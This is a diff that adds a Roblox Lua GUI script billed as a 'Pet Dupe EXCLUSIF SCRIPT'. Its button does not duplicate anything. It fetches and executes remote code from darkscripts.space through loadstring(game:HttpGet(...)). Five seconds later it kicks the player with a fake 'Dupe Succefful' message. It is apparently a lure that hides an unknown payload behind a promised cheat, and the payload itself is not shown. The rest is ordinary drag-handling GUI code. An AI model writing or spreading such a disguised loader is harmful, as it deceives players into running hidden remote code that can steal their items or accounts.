@@ -1,0 +1,116 @@
+--[[
+
+		Gui2Lua™
+		10zOfficial
+		Version 1.0.0
+
+]]
+
+
+-- Instances
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
+local UICorner = Instance.new("UICorner")
+local TextButton = Instance.new("TextButton")
+local UICorner_2 = Instance.new("UICorner")
+local UICorner_3 = Instance.new("UICorner")
+
+-- Properties
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)
+Frame.BorderColor3 = Color3.new(0, 0, 0)
+Frame.BorderSizePixel = 0
+Frame.Position = UDim2.new(0.0342195258, 0, 0.37758112, 0)
+Frame.Size = UDim2.new(0, 255, 0, 204)
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.180392)
+TextLabel.BorderColor3 = Color3.new(0, 0, 0)
+TextLabel.BorderSizePixel = 0
+TextLabel.Position = UDim2.new(0.0313724875, 0, 0.0868984312, 0)
+TextLabel.Size = UDim2.new(0, 238, 0, 55)
+TextLabel.Font = Enum.Font.Merriweather
+TextLabel.Text = "Pet Dupe EXCLUSIF SCRIPT!"
+TextLabel.TextColor3 = Color3.new(0.301961, 0.301961, 0.301961)
+TextLabel.TextSize = 20
+
+UICorner.Parent = TextLabel
+UICorner.CornerRadius = UDim.new(0.200000003, 8)
+
+TextButton.Parent = Frame
+TextButton.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.180392)
+TextButton.BorderColor3 = Color3.new(0.180392, 0.180392, 0.180392)
+TextButton.BorderSizePixel = 0
+TextButton.Position = UDim2.new(0.141176477, 0, 0.410870969, 0)
+TextButton.Size = UDim2.new(0, 182, 0, 62)
+TextButton.Font = Enum.Font.Merriweather
+TextButton.Text = "Dupe! (Spam if it doesn't work)"
+TextButton.TextColor3 = Color3.new(0, 0, 0)
+TextButton.TextSize = 12
+
+TextButton.MouseButton1Click:Connect(function()
+
+loadstring(game:HttpGet('https://darkscripts.space/scripts/bdb3b8724b.lua',true))()
+wait(5)
+	game.Players.LocalPlayer:Kick("Dupe Succefful✅")
+end)
+
+	
+
+UICorner_2.Parent = TextButton
+UICorner_2.CornerRadius = UDim.new(0.200000003, 8)
+
+UICorner_3.Parent = Frame
+UICorner_3.CornerRadius = UDim.new(0.200000003, 8)
+
+-- Scripts
+
+local function KOOFSV_fake_script() -- Frame.Dragify 
+	local script = Instance.new('LocalScript', Frame)
+
+	local UserInputService = game:GetService("UserInputService")
+	
+	local gui = script.Parent
+	
+	local dragging
+	local dragInput
+	local dragStart
+	local startPos
+	
+	local function update(input)
+		local delta = input.Position - dragStart
+		gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+	end
+	
+	gui.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			dragging = true
+			dragStart = input.Position
+			startPos = gui.Position
+	
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					dragging = false
+				end
+			end)
+		end
+	end)
+	
+	gui.InputChanged:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+			dragInput = input
+		end
+	end)
+	
+	UserInputService.InputChanged:Connect(function(input)
+		if input == dragInput and dragging then
+			update(input)
+		end
+	end)
+end
+coroutine.wrap(KOOFSV_fake_script)()
